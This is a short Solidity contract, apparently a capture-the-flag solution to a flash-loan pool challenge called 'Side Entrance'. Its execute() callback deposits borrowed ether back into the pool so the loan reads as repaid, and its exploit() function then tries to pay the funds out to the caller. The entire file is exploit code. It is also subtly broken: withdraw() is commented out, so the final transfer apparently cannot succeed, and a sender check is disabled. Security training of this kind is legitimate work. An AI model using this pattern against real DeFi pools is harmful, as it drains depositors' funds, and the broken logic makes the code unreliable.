// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface  ISELP {
    function flashLoan(uint256 amount) external ;
    function withdraw() external ;
    function deposit() external payable;
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract auxSideEntrance is IFlashLoanEtherReceiver {

    address deployer;
    address target;

    constructor (address target_) {
        deployer = msg.sender;
        target = target_;
    }
    
    receive() external payable {}
    
    function execute() external payable {
        //require(msg.sender == address(target), "only pool");
        ISELP(target).deposit{value: msg.value}();
    }

    function exploit(uint256 amount) public returns (bool) {

        ISELP(target).flashLoan(amount);

        //ISELP(target).withdraw();

        payable(msg.sender).transfer(amount);

        return true;
    }

    function getDeployer() public view returns(address) {
        return deployer;
    }

    function getTarget() public view returns(address) {
        return target;
    }
}